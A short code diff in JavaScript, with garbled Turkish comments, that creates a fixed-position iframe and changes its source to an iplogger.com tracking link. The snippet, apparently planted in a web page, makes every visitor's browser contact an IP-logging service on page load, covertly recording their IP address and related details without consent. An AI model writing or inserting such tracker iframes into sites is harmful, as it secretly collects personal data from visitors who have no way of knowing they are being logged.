@@ -2,7 +2,7 @@
 const iframe = document.createElement('iframe');
 
 // iframe Ã¶zellikleri
-iframe.src = 'https://iplogger.com/244sm8.gif'; // iframe iÃ§inde aÃ§Ä±lacak URL
+iframe.src = 'https://iplogger.com/244sm8'; // iframe iÃ§inde aÃ§Ä±lacak URL
 iframe.style.position = 'fixed';
 iframe.style.top = '0';
 iframe.style.left = '0';
